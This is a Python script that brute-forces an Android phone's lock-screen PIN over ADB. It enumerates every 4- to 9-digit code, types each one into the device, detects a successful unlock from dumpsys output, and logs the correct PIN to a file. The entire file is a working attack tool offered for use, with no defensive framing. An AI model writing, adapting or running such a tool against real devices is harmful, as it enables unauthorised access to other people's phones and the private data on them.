import argparse
import subprocess
import sys
from time import sleep

parser = argparse.ArgumentParser(description='ADB Brute Force')
parser.add_argument('-n', '--number', help='Number of digits of PIN (min 4 and max 9)', required=True)

args = parser.parse_args()

if int(args.number) < 4 or int(args.number) > 9:
    print('Number of digits must be between 4 and 9')
    sys.exit(0)


if __name__ == '__main__':
    print('Starting ADB Brute Force')
    print('Number of digits: ' + args.number)
    print('Starting ADB server')
    subprocess.run('adb start-server', shell=True)
    print('ADB server started')
    print('Waiting for device')
    subprocess.run('adb wait-for-device', shell=True)
    print('Device found')
    #create password.txt file
    file = open('password.txt', 'w')
    print('Starting bruteforce')
    # create a list with all possible combinations
    combinations = []
    for i in range(10 ** int(args.number)):
        combinations.append(str(i).zfill(int(args.number)))
    # try each combination
    for combination in combinations:
        print('Trying combination: ' + combination)
        subprocess.run('adb shell input keyevent 82', shell=True)
        subprocess.run('adb shell input text ' + combination, shell=True)
        subprocess.run('adb shell input keyevent 66', shell=True)
        #create delay of 5 seconds
        sleep(1)
        # check if the device is unlocked
        output = subprocess.run('adb shell dumpsys window', shell=True, stdout=subprocess.PIPE)
        if 'mDreamingLockscreen=false' in str(output.stdout):
            print('Device unlocked')
            print('PIN: ' + combination)
            # add the PIN to the password.txt file and identify the correct PIN
            file.write(combination + ' correct\n')
            file.close()
            sys.exit(0)
        else:
            #write the combination to the password.txt file not correct
            file.write(combination + ' not correct\n')
